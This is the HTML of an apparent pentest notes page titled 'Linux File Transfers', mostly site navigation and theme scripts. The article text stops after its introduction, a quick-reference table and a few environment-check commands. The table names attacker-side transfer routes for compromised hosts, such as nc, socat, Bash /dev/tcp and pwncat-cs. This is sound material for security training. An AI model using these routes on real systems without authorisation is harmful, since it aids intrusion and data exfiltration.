@@ -1,0 +1,842 @@
+<!DOCTYPE html><html lang="en" data-theme="dful-dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><script>
+      (() => {
+        const storageKey = 'dful-theme';
+        const schemaKey = 'dful-theme-schema';
+        const schemaVersion = '2';
+        const legacyStorageKey = 'dful-theme-preview';
+        const valid = new Set(["dful-dark","amber-dark","dful-light","flexoki-paper","phosphor","arcade","cobalt"]);
+        const dark = new Set(["dful-dark","amber-dark","phosphor","arcade","cobalt"]);
+        const fallback = "dful-dark";
+        let theme = fallback;
+        try {
+          const needsMigration = localStorage.getItem(schemaKey) !== schemaVersion;
+          let stored = localStorage.getItem(storageKey);
+          if (needsMigration) {
+            if (stored === 'graphite') stored = 'dful-dark';
+            else if (stored === 'dful-dark') stored = 'amber-dark';
+            localStorage.setItem(schemaKey, schemaVersion);
+            if (stored) localStorage.setItem(storageKey, stored);
+          }
+          if (valid.has(stored)) theme = stored;
+          else {
+            let legacy = localStorage.getItem(legacyStorageKey);
+            if (needsMigration) {
+              if (legacy === 'graphite') legacy = 'dful-dark';
+              else if (legacy === 'dful-dark') legacy = 'amber-dark';
+            }
+            if (valid.has(legacy)) {
+              theme = legacy;
+              localStorage.setItem(storageKey, legacy);
+            }
+            if (legacy) localStorage.removeItem(legacyStorageKey);
+          }
+          localStorage.setItem(storageKey, theme);
+        } catch {}
+        document.documentElement.dataset.theme = theme;
+        document.documentElement.style.colorScheme = dark.has(theme) ? 'dark' : 'light';
+      })();</script><meta name="description" content="Practical Linux file-transfer methods for shells, SSH sessions, constrained hosts, and common pentest fallback paths."><link rel="canonical" href="https://dful.github.io/en/notes/linux-file-transfers/"><link rel="alternate" hreflang="en" href="https://dful.github.io/en/notes/linux-file-transfers/"><link rel="alternate" hreflang="es" href="https://dful.github.io/es/notes/transferencias-de-archivos-en-linux/"><link rel="alternate" hreflang="x-default" href="https://dful.github.io/en/notes/linux-file-transfers/"><meta property="og:url" content="https://dful.github.io/en/notes/linux-file-transfers/"><meta property="og:type" content="website"><meta property="og:site_name" content="dful"><meta property="og:title" content="Linux File Transfers · dful"><meta property="og:description" content="Practical Linux file-transfer methods for shells, SSH sessions, constrained hosts, and common pentest fallback paths."><meta property="og:locale" content="en_GB"><meta property="og:locale:alternate" content="es_ES"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Linux File Transfers · dful"><meta name="twitter:description" content="Practical Linux file-transfer methods for shells, SSH sessions, constrained hosts, and common pentest fallback paths."><meta name="generator" content="Astro v7.3.2"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><title>Linux File Transfers · dful</title><link rel="stylesheet" href="/_astro/notes.DkEzeG-w.css"><link rel="stylesheet" href="/_astro/BaseLayout.l85KjHsw.css"><link rel="stylesheet" href="/_astro/publishing.C5o61NTe.css"></head><body><a class="skip-link" href="#main">Skip to content</a><header class="site-header"><div class="header-inner"><a class="wordmark" href="/en/" aria-label="dful home">dful<span>.</span></a><nav class="primary-nav" aria-label="Primary"><a href="/en/" data-active="false">Home</a><a href="/en/notes/" data-active="true" aria-current="page">Notes</a><a href="/en/research/" data-active="false">Research</a><a href="/en/about/" data-active="false">About</a></nav><div class="header-actions"><details class="theme-picker" data-theme-picker data-astro-cid-hcqnpaxe><summary aria-label="Theme" data-astro-cid-hcqnpaxe><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M12 3.25a8.75 8.75 0 1 0 0 17.5h1.25a2.25 2.25 0 0 0 0-4.5h-.75a1.75 1.75 0 0 1 0-3.5h2.35A5.9 5.9 0 0 0 20.75 6.9C18.72 4.63 15.72 3.25 12 3.25Z"></path><circle cx="7.4" cy="10" r=".7" fill="currentColor" stroke="none"></circle><circle cx="9.25" cy="6.9" r=".7" fill="currentColor" stroke="none"></circle><circle cx="13" cy="6.2" r=".7" fill="currentColor" stroke="none"></circle><circle cx="16.25" cy="8" r=".7" fill="currentColor" stroke="none"></circle></svg><span class="theme-current" data-theme-current data-astro-cid-hcqnpaxe>Dful Dark</span></summary><div class="theme-menu" aria-label="Theme" data-astro-cid-hcqnpaxe><div class="theme-menu-head" data-astro-cid-hcqnpaxe>Theme</div><button type="button" aria-pressed="true" data-theme-option="dful-dark" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#111214" data-astro-cid-hcqnpaxe></i><i style="--swatch:#f0eee8" data-astro-cid-hcqnpaxe></i><i style="--swatch:#ff8b3d" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Dful Dark</span></button><button type="button" aria-pressed="false" data-theme-option="amber-dark" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#0c0c0b" data-astro-cid-hcqnpaxe></i><i style="--swatch:#f2efe7" data-astro-cid-hcqnpaxe></i><i style="--swatch:#ff9f2f" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Amber Dark</span></button><button type="button" aria-pressed="false" data-theme-option="dful-light" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#f7f3ea" data-astro-cid-hcqnpaxe></i><i style="--swatch:#171511" data-astro-cid-hcqnpaxe></i><i style="--swatch:#b94d08" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Dful Light</span></button><button type="button" aria-pressed="false" data-theme-option="flexoki-paper" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#fffcf0" data-astro-cid-hcqnpaxe></i><i style="--swatch:#100f0f" data-astro-cid-hcqnpaxe></i><i style="--swatch:#bc5215" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Flexoki Paper</span></button><button type="button" aria-pressed="false" data-theme-option="phosphor" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#030604" data-astro-cid-hcqnpaxe></i><i style="--swatch:#c8f7cf" data-astro-cid-hcqnpaxe></i><i style="--swatch:#48ff78" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Phosphor</span></button><button type="button" aria-pressed="false" data-theme-option="arcade" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#11102b" data-astro-cid-hcqnpaxe></i><i style="--swatch:#fff4d7" data-astro-cid-hcqnpaxe></i><i style="--swatch:#4de9ff" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Arcade</span></button><button type="button" aria-pressed="false" data-theme-option="cobalt" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#07111f" data-astro-cid-hcqnpaxe></i><i style="--swatch:#edf6ff" data-astro-cid-hcqnpaxe></i><i style="--swatch:#42b9ff" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Cobalt</span></button></div></details><script>
+  (() => {
+    const storageKey = 'dful-theme';
+    const themes = [{"id":"dful-dark","name":"Dful Dark","colorScheme":"dark"},{"id":"amber-dark","name":"Amber Dark","colorScheme":"dark"},{"id":"dful-light","name":"Dful Light","colorScheme":"light"},{"id":"flexoki-paper","name":"Flexoki Paper","colorScheme":"light"},{"id":"phosphor","name":"Phosphor","colorScheme":"dark"},{"id":"arcade","name":"Arcade","colorScheme":"dark"},{"id":"cobalt","name":"Cobalt","colorScheme":"dark"}];
+    const valid = new Set(themes.map(({ id }) => id));
+    const names = Object.fromEntries(themes.map(({ id, name }) => [id, name]));
+    const isDark = (theme) => themes.find((item) => item.id === theme)?.colorScheme === 'dark';
+    const apply = (theme) => {
+      const selected = valid.has(theme) ? theme : "dful-dark";
+      document.documentElement.dataset.theme = selected;
+      document.documentElement.style.colorScheme = isDark(selected) ? 'dark' : 'light';
+      try { localStorage.setItem(storageKey, selected); } catch {}
+      document.querySelectorAll('[data-theme-picker]').forEach((picker) => {
+        const current = picker.querySelector('[data-theme-current]');
+        if (current) current.textContent = names[selected];
+        picker.querySelectorAll('[data-theme-option]').forEach((button) => button.setAttribute('aria-pressed', button.getAttribute('data-theme-option') === selected ? 'true' : 'false'));
+      });
+    };
+    const enhance = () => {
+      document.querySelectorAll('[data-theme-picker]:not([data-enhanced])').forEach((picker) => {
+        picker.setAttribute('data-enhanced','true');
+        picker.addEventListener('keydown', (event) => {
+          if (event.key === 'Escape' && picker.open) {
+            picker.removeAttribute('open');
+            picker.querySelector('summary').focus();
+          }
+        });
+        picker.querySelectorAll('[data-theme-option]').forEach((button) => button.addEventListener('click', () => {
+          apply(button.getAttribute('data-theme-option'));
+          picker.removeAttribute('open');
+          picker.querySelector('summary').focus();
+        }));
+      });
+      let stored = "dful-dark";
+      try { stored = localStorage.getItem(storageKey) || stored; } catch {}
+      apply(stored);
+    };
+    enhance();
+    document.addEventListener('astro:page-load', enhance);
+  })();</script><nav class="lang-switch" aria-label="Switch language"><a href="/en/notes/linux-file-transfers/" data-active="true" aria-current="page">EN</a><a href="/es/notes/transferencias-de-archivos-en-linux/" data-active="false">ES</a></nav><div class="social-links" aria-label="Social links"><a href="https://github.com/dful" rel="me">GitHub</a><a href="https://www.linkedin.com/in/daniel-fulladosa/" rel="me">LinkedIn</a></div></div></div></header><main id="main"><div class="notes-page" data-note-slug="linux-file-transfers"><div class="notes-shell"><aside class="notes-tree" aria-label="Knowledge tree"><div class="notes-side-head"><strong>Knowledge tree</strong></div><script>
+  (() => { document.documentElement.setAttribute('data-notes-tree-pending', 'true'); })();
+</script><ul class="knowledge-tree" data-notes-tree data-notes-tree-locale="en"><li data-depth="0" data-node-type="category" data-tree-key="domain:ai" data-active-path="false"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="2.5"></circle><circle cx="5" cy="6" r="1.75"></circle><circle cx="19" cy="6" r="1.75"></circle><circle cx="12" cy="20" r="1.75"></circle><path d="m10.2 10.4-3.8-3.2m7.4 3.2 3.8-3.2M12 14.5v3.75"></path></svg></span><span>AI</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:fundamentals" data-active-path="false"><details><summary><span>Fundamentals</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:tokens-context" data-active-path="false"><a href="/en/notes/tokens-context/"><span>Tokens &amp; Context</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:inference" data-active-path="false"><a href="/en/notes/inference/"><span>Inference</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:reasoning" data-active-path="false"><a href="/en/notes/reasoning/"><span>Reasoning</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:context-engineering" data-active-path="false"><a href="/en/notes/context-engineering/"><span>Context Engineering</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:agents" data-active-path="false"><details><summary><span>Agents</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:agent-loop" data-active-path="false"><a href="/en/notes/agent-loop/"><span>Agent Loop</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:agent-harness" data-active-path="false"><a href="/en/notes/agent-harness/"><span>Agent Harness</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:tool-use" data-active-path="false"><a href="/en/notes/tool-use/"><span>Tool Use</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:subagents" data-active-path="false"><a href="/en/notes/subagents/"><span>Subagents</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:security" data-active-path="false"><details><summary><span>Security</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:prompt-injection" data-active-path="false"><a href="/en/notes/prompt-injection/"><span>Prompt Injection</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:agent-permissions" data-active-path="false"><a href="/en/notes/agent-permissions/"><span>Agent Permissions</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:sandboxing-egress" data-active-path="false"><a href="/en/notes/sandboxing-egress/"><span>Sandboxing &amp; Egress</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:applied-ai" data-active-path="false"><details><summary><span>Applied AI</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:model-apis" data-active-path="false"><a href="/en/notes/model-apis/"><span>Model APIs</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:api-pricing" data-active-path="false"><a href="/en/notes/api-pricing/"><span>API Pricing</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:deployment-models" data-active-path="false"><a href="/en/notes/deployment-models/"><span>Deployment Models</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:local-inference" data-active-path="false"><a href="/en/notes/local-inference/"><span>Local Inference</span></a></li></ul></details></li></ul></details></li><li data-depth="0" data-node-type="category" data-tree-key="domain:offensive-security" data-active-path="true"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M12 2.75 19 5.4v5.45c0 4.65-2.8 8.15-7 10.4-4.2-2.25-7-5.75-7-10.4V5.4L12 2.75Z"></path><path d="m9 12 2 2 4-4"></path></svg></span><span>Offensive Security</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:shells" data-active-path="false"><details><summary><span>Shells</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:remote-access" data-active-path="false"><a href="/en/notes/remote-access/"><span>Remote Access</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:file-transfer" data-active-path="true"><details open><summary><span>File Transfer</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:windows-file-transfers" data-active-path="false"><a href="/en/notes/windows-file-transfers/"><span>Windows File Transfers</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:linux-file-transfers" data-active-path="true"><a href="/en/notes/linux-file-transfers/" aria-current="page"><span>Linux File Transfers</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:web-applications" data-active-path="false"><details><summary><span>Web Applications</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:php-web-testing" data-active-path="false"><a href="/en/notes/php-web-testing/"><span>PHP Web Testing</span></a></li></ul></details></li></ul></details></li></ul><script>
+  (() => {
+    if (globalThis.__dfulNotesTreeState) return;
+    globalThis.__dfulNotesTreeState = true;
+    const storagePrefix = 'dful-notes-tree:v1:';
+    let syncing = false;
+    const ignoredToggles = new WeakSet();
+
+    const trees = () => [...document.querySelectorAll('[data-notes-tree]')];
+    const details = () => trees().flatMap((tree) => [...tree.querySelectorAll('[data-tree-key] > details')]);
+    const keyFor = (detail) => detail.parentElement?.getAttribute('data-tree-key');
+    const activePath = (detail) => detail.parentElement?.getAttribute('data-active-path') === 'true';
+    const localeFor = () => document.querySelector('[data-notes-tree-locale]')?.getAttribute('data-notes-tree-locale') || 'en';
+    const storageKey = () => `${storagePrefix}${localeFor()}`;
+
+    const readState = () => {
+      try {
+        const parsed = JSON.parse(localStorage.getItem(storageKey()) || '{}');
+        return parsed && typeof parsed === 'object' ? parsed : {};
+      } catch {
+        return {};
+      }
+    };
+
+    const writeState = (state) => {
+      try { localStorage.setItem(storageKey(), JSON.stringify(state)); } catch {}
+    };
+
+    const syncKey = (key, open) => {
+      syncing = true;
+      details().filter((detail) => keyFor(detail) === key).forEach((detail) => {
+        if (detail.open === open) return;
+        ignoredToggles.add(detail);
+        detail.open = open;
+      });
+      syncing = false;
+    };
+
+    const applyState = () => {
+      const state = readState();
+      syncing = true;
+      details().forEach((detail) => {
+        const key = keyFor(detail);
+        if (!key) return;
+        const item = detail.parentElement;
+        const defaultOpen = item?.getAttribute('data-depth') === '0';
+        detail.open = activePath(detail) || (typeof state[key] === 'boolean' ? state[key] : defaultOpen);
+      });
+      syncing = false;
+    };
+
+    const enhance = () => {
+      if (!trees().length) {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+        return;
+      }
+      try {
+        applyState();
+      } finally {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+      }
+      details().filter((detail) => !detail.hasAttribute('data-tree-state-bound')).forEach((detail) => {
+        detail.setAttribute('data-tree-state-bound', 'true');
+        detail.addEventListener('toggle', () => {
+          if (ignoredToggles.delete(detail)) return;
+          if (syncing) return;
+          const key = keyFor(detail);
+          if (!key) return;
+          if (activePath(detail) && !detail.open) {
+            const state = readState();
+            state[key] = false;
+            writeState(state);
+            syncKey(key, true);
+            return;
+          }
+          const state = readState();
+          state[key] = detail.open;
+          writeState(state);
+          syncKey(key, detail.open);
+        });
+      });
+    };
+
+    document.addEventListener('astro:page-load', enhance);
+    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', enhance, { once:true });
+    else enhance();
+  })();
+</script></aside><div class="notes-detail-shell"><article class="notes-article"><div class="notes-mobile-nav"><details><summary>Knowledge tree</summary><div><script>
+  (() => { document.documentElement.setAttribute('data-notes-tree-pending', 'true'); })();
+</script><ul class="knowledge-tree" data-notes-tree data-notes-tree-locale="en"><li data-depth="0" data-node-type="category" data-tree-key="domain:ai" data-active-path="false"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="2.5"></circle><circle cx="5" cy="6" r="1.75"></circle><circle cx="19" cy="6" r="1.75"></circle><circle cx="12" cy="20" r="1.75"></circle><path d="m10.2 10.4-3.8-3.2m7.4 3.2 3.8-3.2M12 14.5v3.75"></path></svg></span><span>AI</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:fundamentals" data-active-path="false"><details><summary><span>Fundamentals</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:tokens-context" data-active-path="false"><a href="/en/notes/tokens-context/"><span>Tokens &amp; Context</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:inference" data-active-path="false"><a href="/en/notes/inference/"><span>Inference</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:reasoning" data-active-path="false"><a href="/en/notes/reasoning/"><span>Reasoning</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:context-engineering" data-active-path="false"><a href="/en/notes/context-engineering/"><span>Context Engineering</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:agents" data-active-path="false"><details><summary><span>Agents</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:agent-loop" data-active-path="false"><a href="/en/notes/agent-loop/"><span>Agent Loop</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:agent-harness" data-active-path="false"><a href="/en/notes/agent-harness/"><span>Agent Harness</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:tool-use" data-active-path="false"><a href="/en/notes/tool-use/"><span>Tool Use</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:subagents" data-active-path="false"><a href="/en/notes/subagents/"><span>Subagents</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:security" data-active-path="false"><details><summary><span>Security</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:prompt-injection" data-active-path="false"><a href="/en/notes/prompt-injection/"><span>Prompt Injection</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:agent-permissions" data-active-path="false"><a href="/en/notes/agent-permissions/"><span>Agent Permissions</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:sandboxing-egress" data-active-path="false"><a href="/en/notes/sandboxing-egress/"><span>Sandboxing &amp; Egress</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:applied-ai" data-active-path="false"><details><summary><span>Applied AI</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:model-apis" data-active-path="false"><a href="/en/notes/model-apis/"><span>Model APIs</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:api-pricing" data-active-path="false"><a href="/en/notes/api-pricing/"><span>API Pricing</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:deployment-models" data-active-path="false"><a href="/en/notes/deployment-models/"><span>Deployment Models</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:local-inference" data-active-path="false"><a href="/en/notes/local-inference/"><span>Local Inference</span></a></li></ul></details></li></ul></details></li><li data-depth="0" data-node-type="category" data-tree-key="domain:offensive-security" data-active-path="true"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M12 2.75 19 5.4v5.45c0 4.65-2.8 8.15-7 10.4-4.2-2.25-7-5.75-7-10.4V5.4L12 2.75Z"></path><path d="m9 12 2 2 4-4"></path></svg></span><span>Offensive Security</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:shells" data-active-path="false"><details><summary><span>Shells</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:remote-access" data-active-path="false"><a href="/en/notes/remote-access/"><span>Remote Access</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:file-transfer" data-active-path="true"><details open><summary><span>File Transfer</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:windows-file-transfers" data-active-path="false"><a href="/en/notes/windows-file-transfers/"><span>Windows File Transfers</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:linux-file-transfers" data-active-path="true"><a href="/en/notes/linux-file-transfers/" aria-current="page"><span>Linux File Transfers</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:web-applications" data-active-path="false"><details><summary><span>Web Applications</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:php-web-testing" data-active-path="false"><a href="/en/notes/php-web-testing/"><span>PHP Web Testing</span></a></li></ul></details></li></ul></details></li></ul><script>
+  (() => {
+    if (globalThis.__dfulNotesTreeState) return;
+    globalThis.__dfulNotesTreeState = true;
+    const storagePrefix = 'dful-notes-tree:v1:';
+    let syncing = false;
+    const ignoredToggles = new WeakSet();
+
+    const trees = () => [...document.querySelectorAll('[data-notes-tree]')];
+    const details = () => trees().flatMap((tree) => [...tree.querySelectorAll('[data-tree-key] > details')]);
+    const keyFor = (detail) => detail.parentElement?.getAttribute('data-tree-key');
+    const activePath = (detail) => detail.parentElement?.getAttribute('data-active-path') === 'true';
+    const localeFor = () => document.querySelector('[data-notes-tree-locale]')?.getAttribute('data-notes-tree-locale') || 'en';
+    const storageKey = () => `${storagePrefix}${localeFor()}`;
+
+    const readState = () => {
+      try {
+        const parsed = JSON.parse(localStorage.getItem(storageKey()) || '{}');
+        return parsed && typeof parsed === 'object' ? parsed : {};
+      } catch {
+        return {};
+      }
+    };
+
+    const writeState = (state) => {
+      try { localStorage.setItem(storageKey(), JSON.stringify(state)); } catch {}
+    };
+
+    const syncKey = (key, open) => {
+      syncing = true;
+      details().filter((detail) => keyFor(detail) === key).forEach((detail) => {
+        if (detail.open === open) return;
+        ignoredToggles.add(detail);
+        detail.open = open;
+      });
+      syncing = false;
+    };
+
+    const applyState = () => {
+      const state = readState();
+      syncing = true;
+      details().forEach((detail) => {
+        const key = keyFor(detail);
+        if (!key) return;
+        const item = detail.parentElement;
+        const defaultOpen = item?.getAttribute('data-depth') === '0';
+        detail.open = activePath(detail) || (typeof state[key] === 'boolean' ? state[key] : defaultOpen);
+      });
+      syncing = false;
+    };
+
+    const enhance = () => {
+      if (!trees().length) {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+        return;
+      }
+      try {
+        applyState();
+      } finally {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+      }
+      details().filter((detail) => !detail.hasAttribute('data-tree-state-bound')).forEach((detail) => {
+        detail.setAttribute('data-tree-state-bound', 'true');
+        detail.addEventListener('toggle', () => {
+          if (ignoredToggles.delete(detail)) return;
+          if (syncing) return;
+          const key = keyFor(detail);
+          if (!key) return;
+          if (activePath(detail) && !detail.open) {
+            const state = readState();
+            state[key] = false;
+            writeState(state);
+            syncKey(key, true);
+            return;
+          }
+          const state = readState();
+          state[key] = detail.open;
+          writeState(state);
+          syncKey(key, detail.open);
+        });
+      });
+    };
+
+    document.addEventListener('astro:page-load', enhance);
+    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', enhance, { once:true });
+    else enhance();
+  })();
+</script></div></details><details><summary>On this page</summary><div><ul><li data-depth="2"><a href="#quick-reference">Quick reference</a></li><li data-depth="2"><a href="#http">HTTP</a></li><li data-depth="3"><a href="#attacker-setup">Attacker setup</a></li><li data-depth="3"><a href="#download">Download</a></li><li data-depth="3"><a href="#resuming-an-interrupted-download">Resuming an interrupted download</a></li><li data-depth="2"><a href="#http-upload">HTTP upload</a></li><li data-depth="3"><a href="#attacker-setup-with-uploadserver">Attacker setup with uploadserver</a></li><li data-depth="3"><a href="#upload-with-curl">Upload with curl</a></li><li data-depth="2"><a href="#ssh-and-sftp">SSH and SFTP</a></li><li data-depth="3"><a href="#scp">scp</a></li><li data-depth="3"><a href="#sftp">SFTP</a></li><li data-depth="3"><a href="#rsync-over-ssh">rsync over SSH</a></li><li data-depth="3"><a href="#streaming-through-ssh">Streaming through SSH</a></li><li data-depth="2"><a href="#raw-tcp">Raw TCP</a></li><li data-depth="3"><a href="#ncat">Ncat</a></li><li data-depth="3"><a href="#nc-on-a-constrained-target">nc on a constrained target</a></li><li data-depth="3"><a href="#socat">socat</a></li><li data-depth="3"><a href="#bash-devtcp">Bash /dev/tcp</a></li><li data-depth="2"><a href="#existing-shell-handler">Existing shell handler</a></li><li data-depth="3"><a href="#pwncat-cs">pwncat-cs</a></li><li data-depth="2"><a href="#smb">SMB</a></li><li data-depth="3"><a href="#attacker-setup-1">Attacker setup</a></li><li data-depth="3"><a href="#download-with-smbclient">Download with smbclient</a></li><li data-depth="3"><a href="#upload-with-smbclient">Upload with smbclient</a></li><li data-depth="2"><a href="#text-only-channels">Text-only channels</a></li><li data-depth="3"><a href="#base64">Base64</a></li><li data-depth="3"><a href="#hex-with-xxd">Hex with xxd</a></li><li data-depth="2"><a href="#packaging-and-streaming-directories">Packaging and streaming directories</a></li><li data-depth="2"><a href="#verification-and-troubleshooting">Verification and troubleshooting</a></li><li data-depth="3"><a href="#hashes">Hashes</a></li><li data-depth="3"><a href="#file-type-and-permissions">File type and permissions</a></li><li data-depth="3"><a href="#common-failures">Common failures</a></li><li data-depth="2"><a href="#references">References</a></li></ul></div></details></div><header class="notes-header"><div class="notes-header-pretitle"><nav class="notes-breadcrumb" aria-label="Breadcrumb"><span>Offensive Security</span><i aria-hidden="true">/</i><span>File Transfer</span></nav></div><h1>Linux File Transfers</h1><div class="notes-deck">Practical Linux file-transfer methods for shells, SSH sessions, constrained hosts, and common pentest fallback paths.</div><small>Updated 25 Aug 2026</small></header><div class="publishing-prose"><p>On Linux, file transfer is usually a question of what the current shell can execute, which direction the target can reach, and whether an existing session already gives you a transport. A host with <code>curl</code> or <code>wget</code> may only need HTTP. A system with SSH can use <code>scp</code>, SFTP, <code>rsync</code>, or a raw SSH stream. A restricted reverse shell may leave only <code>nc</code>, Bash redirections, Base64, or the file-transfer features of the shell handler itself.</p>
+<p>In this Note, <strong>download</strong> means attacker → Linux and <strong>upload</strong> means Linux → attacker unless a tool explicitly uses different terminology.</p>
+<h2 id="quick-reference">Quick reference</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Situation</th><th>Methods to try</th></tr></thead><tbody><tr><td>HTTP(S) reachable from the target</td><td><code>curl</code>, <code>wget</code>, Python, BusyBox <code>wget</code></td></tr><tr><td>HTTP upload endpoint available</td><td><code>curl</code> multipart POST or HTTP PUT</td></tr><tr><td>SSH credentials/session available</td><td><code>scp</code>, SFTP, <code>rsync</code>, SSH streams</td></tr><tr><td>Only a basic outbound TCP connection works</td><td>Ncat / <code>nc</code>, <code>socat</code>, Bash <code>/dev/tcp</code></td></tr><tr><td>Current shell is managed by pwncat-cs</td><td><code>upload</code> / <code>download</code></td></tr><tr><td>SMB reachable and <code>smbclient</code> exists</td><td><code>smbclient</code> against a temporary share</td></tr><tr><td>Text-only channel</td><td>Base64, optionally hex</td></tr><tr><td>Directory or many files</td><td><code>tar</code>, optionally streamed directly</td></tr><tr><td>Large or unstable transfer</td><td><code>curl -C -</code>, <code>wget -c</code>, SFTP <code>reget</code> / <code>reput</code>, <code>rsync -P</code></td></tr></tbody></table>
+<p>The first useful check is the environment you already have:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">id</span></span>
+<span class="line"><span style="color:#79C0FF">pwd</span></span>
+<span class="line"><span style="color:#79C0FF">umask</span></span>
+<span class="line"><span style="color:#FFA657">ps</span><span style="color:#79C0FF"> -p</span><span style="color:#79C0FF"> $$</span><span style="color:#79C0FF"> -o</span><span style="color:#A5D6FF"> comm=</span></span>
+<span class="line"></span>
